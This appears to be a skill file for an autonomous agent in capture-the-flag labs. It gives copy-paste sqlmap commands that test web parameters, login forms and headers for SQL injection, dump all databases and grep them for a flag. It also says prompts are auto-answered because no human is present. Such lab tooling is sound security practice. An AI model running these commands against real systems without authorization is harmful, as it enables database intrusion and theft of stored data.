---
description: Test a web parameter, form, cookie, or header for SQL injection and dump the database with sqlmap.
---
# web-sqli - test a web parameter for SQL injection and dump data

## When to use
A web page takes user input in a URL parameter, form field, cookie, or header
(e.g. `?id=1`, a login form, a search box) and you suspect the data behind it
holds the flag. Use after `web-enum` has found a dynamic endpoint.

## Fastest path (copy-paste)
Point `sqlmap` at the full URL including the parameter. `--batch` answers every
prompt automatically (required - the agent has no human to answer them):

```sh
sqlmap -u "http://$HAL_TARGET_IP:$HAL_TARGET_PORT/page.php?id=1" --batch --level=2 --risk=2
```

If it reports the parameter is injectable, dump everything and grep for the flag:

```sh
sqlmap -u "http://$HAL_TARGET_IP:$HAL_TARGET_PORT/page.php?id=1" --batch --dump-all --exclude-sysdbs \
  | grep -aiE '(flag|ctf|hal)\{[^}]{1,120}\}'
```

## Common variations
```sh
# POST body / login form:
sqlmap -u "http://$HAL_TARGET_IP:$HAL_TARGET_PORT/login" --data="user=a&pass=a" --batch --level=3

# only enumerate structure first (faster, cheaper):
sqlmap -u "URL?id=1" --batch --dbs            # list databases
sqlmap -u "URL?id=1" --batch -D <db> --tables # list tables
sqlmap -u "URL?id=1" --batch -D <db> -T <tbl> --dump
```

## Tips
- Start `--level`/`--risk` low (1) and raise to 2-3 only if nothing is found.
- If sqlmap finds nothing, the injection may be manual - try `curl "URL?id=1'"`
  and look for a SQL error in the response.
